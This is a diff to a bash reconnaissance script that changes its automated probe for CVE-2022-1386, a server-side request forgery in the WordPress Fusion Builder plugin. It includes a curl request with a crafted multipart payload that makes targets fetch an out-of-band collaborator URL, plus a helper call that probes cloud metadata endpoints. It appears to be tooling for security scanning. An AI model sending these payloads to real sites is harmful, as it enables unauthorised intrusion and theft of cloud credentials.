@@ -167,23 +167,24 @@ _ssrf_probe_cve_2022_1386() {
     : >".tmp/ssrf_cve1386_map.tsv"
     : >".tmp/ssrf_cve1386_probed.txt"
     : >".tmp/ssrf_cve1386_oast_reflected.tsv"
+    : >".tmp/ssrf_cve1386_ajax_targets.txt"
 
-    # Priority only (not confirmation): prior CVE/WP hints from nuclei_output if any.
+    # Exact ajax endpoints from prior nuclei CVE hits — probe these first (not confirmation).
     if [[ -d nuclei_output ]]; then
         grep -ahiE 'CVE-2022-1386|fusion_form_submit_form_to_url' nuclei_output/* 2>/dev/null \
             | grep -aoE 'https?://[^[:space:]"\\]+' \
-            | sed -E 's#(/wp-admin/admin-ajax\.php).*#\1#; t; s|[/?#].*$||' \
-            | sort -u >".tmp/ssrf_cve1386_nuclei_hits.txt" || true
-        if [[ -s ".tmp/ssrf_cve1386_nuclei_hits.txt" ]]; then
-            while IFS= read -r _hit || [[ -n "$_hit" ]]; do
-                [[ -z "$_hit" ]] && continue
-                if [[ "$_hit" == *"/wp-admin/admin-ajax.php" ]]; then
-                    printf '%s\n' "${_hit%/wp-admin/admin-ajax.php}" >>".tmp/ssrf_cve1386_priority.txt"
-                else
-                    printf '%s\n' "$_hit" >>".tmp/ssrf_cve1386_priority.txt"
-                fi
-            done <".tmp/ssrf_cve1386_nuclei_hits.txt"
+            | sed -E 's#(/wp-admin/admin-ajax\.php).*#\1#' \
+            | grep -E '/wp-admin/admin-ajax\.php$' \
+            | sed -E 's#:(443|80)/#/#' \
+            | sort -u >".tmp/ssrf_cve1386_nuclei_ajax.txt" || true
+        if [[ -s ".tmp/ssrf_cve1386_nuclei_ajax.txt" ]]; then
+            cat ".tmp/ssrf_cve1386_nuclei_ajax.txt" >>".tmp/ssrf_cve1386_ajax_targets.txt"
+            sed -E 's#/wp-admin/admin-ajax\.php$##' ".tmp/ssrf_cve1386_nuclei_ajax.txt" \
+                >>".tmp/ssrf_cve1386_priority.txt"
         fi
+        grep -ahiE 'CVE-2022-1386|fusion_form_submit_form_to_url' nuclei_output/* 2>/dev/null \
+            | grep -aoE 'https?://[^[:space:]"\\]+' \
+            | sed -E 's|[/?#].*$||' >>".tmp/ssrf_cve1386_priority.txt" 2>/dev/null || true
     fi
 
     # WordPress-looking hosts (priority).
@@ -196,10 +197,16 @@ _ssrf_probe_cve_2022_1386() {
             | sed -E 's|[/\?#].*$||' >>".tmp/ssrf_cve1386_priority.txt" 2>/dev/null || true
     fi
 
+    # Normalize hosts; strip default :443/:80 so we hit the same URL nuclei matched.
     awk 'NF {
         u=$0
         sub(/\/$/, "", u)
-        if (match(u, /^https?:\/\/[^\/?#]+/)) print substr(u, RSTART, RLENGTH)
+        if (match(u, /^https?:\/\/[^\/?#]+/)) {
+            base=substr(u, RSTART, RLENGTH)
+            sub(/:443$/, "", base)
+            sub(/:80$/, "", base)
+            print base
+        }
     }' ".tmp/ssrf_cve1386_priority.txt" | sort -u >".tmp/ssrf_cve1386_hosts_norm.txt"
 
     awk 'NF {
@@ -207,10 +214,12 @@ _ssrf_probe_cve_2022_1386() {
         sub(/\/$/, "", u)
         if (match(u, /^https?:\/\/[^\/?#]+/)) {
             base=substr(u, RSTART, RLENGTH)
+            sub(/:443$/, "", base)
+            sub(/:80$/, "", base)
             lu=tolower(base)
             rank=3
-            if (lu ~ /^https:\/\/[^\/:]+(:443)?$/) rank=1
-            else if (lu ~ /^http:\/\/[^\/:]+(:80)?$/) rank=2
+            if (lu ~ /^https:\/\//) rank=1
+            else if (lu ~ /^http:\/\//) rank=2
             print rank "\t" base
         }
     }' "$hosts_file" \
@@ -232,15 +241,21 @@ _ssrf_probe_cve_2022_1386() {
     fi
     sort -u ".tmp/ssrf_cve1386_hosts_norm.txt" -o ".tmp/ssrf_cve1386_hosts_norm.txt"
 
-    [[ -s ".tmp/ssrf_cve1386_hosts_norm.txt" ]] || return 0
-
-    oast_host=$(printf '%s' "${COLLAB_SERVER_FIX:-${COLLAB_SERVER_URL:-}}" | sed -E 's#^https?://##; s#^FFUFHASH\.##')
-    _print_msg INFO "Running: CVE-2022-1386 Fusion Builder SSRF + multi-cloud sinks ($(wc -l <".tmp/ssrf_cve1386_hosts_norm.txt" | tr -d ' ') host(s))"
-
+    # Expand bases → ajax endpoints (nuclei exact URLs already in ajax_targets).
     while IFS= read -r base_url || [[ -n "$base_url" ]]; do
         [[ -z "$base_url" ]] && continue
-        ajax_url="${base_url%/}/wp-admin/admin-ajax.php"
-        token="cve1386$(_hash_string "$base_url" | cut -c1-8)"
+        printf '%s/wp-admin/admin-ajax.php\n' "${base_url%/}" >>".tmp/ssrf_cve1386_ajax_targets.txt"
+    done <".tmp/ssrf_cve1386_hosts_norm.txt"
+    sort -u ".tmp/ssrf_cve1386_ajax_targets.txt" -o ".tmp/ssrf_cve1386_ajax_targets.txt"
+
+    [[ -s ".tmp/ssrf_cve1386_ajax_targets.txt" ]] || return 0
+
+    oast_host=$(printf '%s' "${COLLAB_SERVER_FIX:-${COLLAB_SERVER_URL:-}}" | sed -E 's#^https?://##; s#^FFUFHASH\.##')
+    _print_msg INFO "Running: CVE-2022-1386 Fusion Builder SSRF + multi-cloud sinks ($(wc -l <".tmp/ssrf_cve1386_ajax_targets.txt" | tr -d ' ') endpoint(s))"
+
+    while IFS= read -r ajax_url || [[ -n "$ajax_url" ]]; do
+        [[ -z "$ajax_url" ]] && continue
+        token="cve1386$(_hash_string "$ajax_url" | cut -c1-8)"
         oast_url=""
         oast_reflected=0
 
@@ -250,7 +265,7 @@ _ssrf_probe_cve_2022_1386() {
             printf '%s\t%s\n' "$token" "$ajax_url" >>".tmp/ssrf_cve1386_map.tsv"
 
             nonce="0"
-            resp=$(run_command curl -sk -m 12 -X POST "$ajax_url" \
+            resp=$(curl -sk -m 12 -X POST "$ajax_url" \
                 -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
                 ${HEADER:+-H "$HEADER"} \
                 --data "action=fusion_form_update_view" 2>/dev/null || true)
@@ -266,7 +281,7 @@ _ssrf_probe_cve_2022_1386() {
             body=$(printf -- '--%s\r\nContent-Disposition: form-data; name="formData"\r\n\r\nemail=recon%%40example.com&fusion_privacy_store_ip_ua=false&fusion_privacy_expiration_interval=48&privacy_expiration_action=ignore&fusion-form-nonce-0=%s&fusion-fields-hold-private-data=\r\n--%s\r\nContent-Disposition: form-data; name="action"\r\n\r\nfusion_form_submit_form_to_url\r\n--%s\r\nContent-Disposition: form-data; name="fusion_form_nonce"\r\n\r\n%s\r\n--%s\r\nContent-Disposition: form-data; name="form_id"\r\n\r\n0\r\n--%s\r\nContent-Disposition: form-data; name="post_id"\r\n\r\n0\r\n--%s\r\nContent-Disposition: form-data; name="field_labels"\r\n\r\n{"email":"Email address"}\r\n--%s\r\nContent-Disposition: form-data; name="hidden_field_names"\r\n\r\n[]\r\n--%s\r\nContent-Disposition: form-data; name="fusionAction"\r\n\r\n%s\r\n--%s\r\nContent-Disposition: form-data; name="fusionActionMethod"\r\n\r\nGET\r\n--%s--\r\n' \
                 "$boundary" "$nonce" "$boundary" "$boundary" "$nonce" "$boundary" "$boundary" "$boundary" "$boundary" "$boundary" "$oast_url" "$boundary" "$boundary")
 
-            resp=$(run_command curl -sk -m 15 -X POST "$ajax_url" \
+            resp=$(curl -sk -m 15 -X POST "$ajax_url" \
                 -H "Content-Type: multipart/form-data; boundary=${boundary}" \
                 -H "X-Requested-With: XMLHttpRequest" \
                 ${HEADER:+-H "$HEADER"} \
@@ -283,18 +298,18 @@ _ssrf_probe_cve_2022_1386() {
 
         probed=$((probed + 1))
 
-        # Multi-cloud sink probe (AWS/GCP/Azure/DO/Oracle/Alibaba/OpenStack) — confirmation.
+        # Call python directly (do not wrap in run_command — need stdout for NDJSON).
         if [[ "$oast_reflected" -eq 1 ]]; then
-            run_command "$pybin" "$json_helper" probe-fusion "$ajax_url" \
+            "$pybin" "$json_helper" probe-fusion "$ajax_url" \
                 --oast-reflected --oast-url "$oast_url" \
                 ${HEADER:+--header "$HEADER"} \
                 2>>"$LOGFILE" | anew -q ".tmp/ssrf_cve1386_hits.txt" || true
         else
-            run_command "$pybin" "$json_helper" probe-fusion "$ajax_url" \
+            "$pybin" "$json_helper" probe-fusion "$ajax_url" \
                 ${HEADER:+--header "$HEADER"} \
                 2>>"$LOGFILE" | anew -q ".tmp/ssrf_cve1386_hits.txt" || true
         fi
-    done <".tmp/ssrf_cve1386_hosts_norm.txt"
+    done <".tmp/ssrf_cve1386_ajax_targets.txt"
 
     if [[ -z "$oast_host" ]]; then
         _print_msg INFO "CVE-2022-1386: no collaborator — confirming via in-band canary + cloud sinks"
@@ -303,7 +318,7 @@ _ssrf_probe_cve_2022_1386() {
     if [[ -s ".tmp/ssrf_cve1386_hits.txt" ]]; then
         notification "SSRF: CVE-2022-1386 confirmed hit(s) → vulns/ssrf_confirmed.txt" warn
     else
-        _print_msg INFO "CVE-2022-1386 probe finished (${probed} host(s); no in-band/cloud/OAST confirmation)"
+        _print_msg INFO "CVE-2022-1386 probe finished (${probed} endpoint(s); no in-band/cloud/OAST confirmation)"
     fi
 }
 
@@ -492,7 +507,7 @@ function ssrf_checks() {
                                 local _pybin=python3
                                 command -v python3 >/dev/null 2>&1 || _pybin=python
                                 [[ -f "${SCRIPTPATH}/lib/ssrf_confirmed_json.py" ]] || continue
-                                run_command "$_pybin" "${SCRIPTPATH}/lib/ssrf_confirmed_json.py" probe-fusion "$_nurl" \
+                                "$_pybin" "${SCRIPTPATH}/lib/ssrf_confirmed_json.py" probe-fusion "$_nurl" \
                                     ${HEADER:+--header "$HEADER"} \
                                     2>>"$LOGFILE" | anew -q ".tmp/ssrf_cve1386_hits.txt" || true
                             done
@@ -640,7 +655,7 @@ function ssrf_checks() {
             if grep -qE '^\{' "vulns/ssrf_confirmed.txt" 2>/dev/null; then
                 notification "SSRF: $(grep -cE '^\{' "vulns/ssrf_confirmed.txt") CONFIRMED finding(s) - see vulns/ssrf_confirmed.txt" warn
             else
-                printf 'RESULT: NO confirmed SSRF (no cloud-sink or OAST NDJSON hits)\n' >>"vulns/ssrf_confirmed.txt"
+                printf 'RESULT: NO confirmed SSRF (no in-band canary, cloud-sink, or OAST NDJSON hits)\n' >>"vulns/ssrf_confirmed.txt"
                 _print_msg INFO "SSRF: no confirmed findings (see vulns/ssrf_confirmed.txt)"
             fi
 
